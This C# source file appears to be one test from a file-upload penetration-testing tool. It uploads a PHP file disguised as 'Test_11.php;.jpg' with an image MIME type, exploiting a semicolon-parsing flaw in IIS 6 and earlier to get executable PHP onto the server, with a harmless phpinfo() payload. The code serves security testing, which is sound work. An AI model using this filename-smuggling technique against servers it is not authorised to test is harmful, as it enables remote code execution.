using System.Text;
using System.Threading.Tasks;

/*
* Test #11
* Description: This test inserts a semi-colon after the forbidden extension and before the permitted extension. 
* The first extension will be taken on IIS <= 6.
*/
namespace Upsploit.Tests {
    class Test11 : Test {
        public override sealed string description { get; set; }
        public override sealed string validation { get; set; }

        public Test11() {
            description = "This test uploads a file (Test_11.php;.jpg) with the MIME type \"image/jpeg\". " +
              "The file is a php file with a semi-colon before the extension, " +
              "this will create the file with just the php extension." +
              "\r\n\r\n" +
              "The test will work on servers using IIS <= 6.";

            validation = "Look for Test_11.php on the web application. " +
                         "If the file exists, the test was a success and the web application is vulnerable.\r\n\r\n" +
                         "If the file no longer has the correct extension, has both extensions or doesn't render in the browser, the test failed";
        }

        internal override async Task runTest(UploadRequest.UploadRequest request) {
            //A semi-colon is 
            const string data = "<?php\n"
                                + "  echo phpinfo();\n"
                                + "?>";

            request.setFileData(Encoding.ASCII.GetBytes(data));
            request.setFileContentType("image/jpeg");
            request.setFileName("Test_11.php;.jpg");

            await request.send();
            printResult(request, "Test 11 (IIS <= 6)");
        }
    }
}